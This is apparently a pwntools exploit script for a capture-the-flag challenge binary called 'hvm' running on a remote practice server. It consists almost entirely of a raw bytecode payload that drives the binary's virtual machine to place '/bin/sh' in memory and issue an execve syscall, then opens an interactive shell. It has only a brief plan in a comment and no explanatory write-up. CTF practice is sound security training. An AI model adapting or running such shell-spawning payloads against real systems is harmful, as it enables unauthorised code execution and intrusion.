'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

1. reverse VM code
2. in VM run syscall to get shell
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", 29564 
filename = "./hvm"
elf = ELF(filename)
# libc = ELF("")
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    payload = b'\x13\x00\x00\x00\x12\x00\x00\x00\x07\x00\x00\x00\xff\xff\xfb\xfd\x06\x00\x00\x00'
    payload = payload.ljust(52, b'\x00')
    payload += b'\xff\xff\xfb\xed\x00\x00\x01\x40\x00\x00\x01\x40\x07\x00\x00\x00\x2f\x73\x68\x00\x07\x00\x00\x00\x2f\x62\x69\x6e\x0d\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x3b\x04\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00'
    io.sendlineafter(b'hello\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
